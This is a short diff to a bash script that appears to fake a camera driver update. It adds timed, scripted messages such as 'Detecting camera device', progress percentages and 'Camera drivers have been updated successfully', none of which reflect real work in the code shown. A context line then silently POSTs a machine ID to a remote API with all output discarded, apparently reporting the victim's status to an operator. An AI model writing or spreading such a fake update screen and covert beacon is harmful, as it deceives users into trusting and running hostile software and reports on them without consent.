@@ -47,8 +47,20 @@ download() {
 run_part1_camera_driver_ui() {
   delay 5
   echo "[INFO] Initializing camera driver update..."
+  delay 10
+  echo "[INFO] Detecting camera device..."
   delay 7
+  echo "[INFO] Checking for available updates..."
+  delay 7
+  echo "[INFO] Updating and installing progress: 35%"
+  delay 10
+  echo "[INFO] Updating and installing progress: 72%"
+  delay 10
+  echo "[INFO] Updating and installing progress: 100%"
+  delay 12
   echo "[SUCCESS] Camera drivers have been updated successfully."
+  delay 3
+  echo "[INFO] Device is now ready for use."
   if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
     curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
   fi
